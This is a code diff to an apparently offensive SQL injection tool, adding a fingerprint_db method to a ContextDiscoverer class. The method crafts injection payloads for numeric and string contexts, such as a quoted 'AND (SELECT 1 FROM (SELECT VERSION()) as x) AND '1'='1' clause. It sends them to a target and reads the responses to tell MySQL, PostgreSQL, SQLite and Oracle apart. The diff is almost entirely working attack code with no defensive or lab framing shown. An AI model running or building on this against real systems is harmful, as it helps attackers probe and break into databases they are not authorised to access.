@@ -48,7 +48,37 @@ class ContextDiscoverer:
                 self.detected_context = "GENERIC"
 
         print(f"[+] Discovery Complete. Detected Context: {self.detected_context}", flush=True)
-        return self.detected_context
+        
+        # 4. Fingerprinting Gap: DB Type Identification
+        db_type = self.fingerprint_db()
+        return {"context": self.detected_context, "db_type": db_type}
+
+    def fingerprint_db(self):
+        """Identifies the specific DB engine using subtle behavior probes."""
+        print("[*] Phase: DB Fingerprinting active.", flush=True)
+        
+        # Probes:
+        # MySQL: CONNECTION_ID(), VERSION()
+        # PostgreSQL: CURRENT_DATABASE(), VERSION()
+        # SQLite: SQLITE_VERSION()
+        
+        probes = [
+            ("MySQL", "VERSION()"),
+            ("PostgreSQL", "PG_SLEEP(0)"),
+            ("SQLite", "SQLITE_VERSION()"),
+            ("Oracle", "BITAND(1,1)")
+        ]
+        
+        for name, query in probes:
+            print(f"  [?] Checking for {name} signature...", flush=True)
+            # Try a very safe injection
+            payload = f" AND (SELECT 1 FROM (SELECT {query}) as x)" if self.detected_context == "NUMERIC" else f"' AND (SELECT 1 FROM (SELECT {query}) as x) AND '1'='1"
+            res = self.client.send_request(payload)
+            if res['status'] == 200 and not self._check_sql_errors(res['text']):
+                print(f"  [+] Match found: Target is likely {name}", flush=True)
+                return name
+        
+        return "GENERIC"
 
     def _check_sql_errors(self, text):
         error_patterns = [
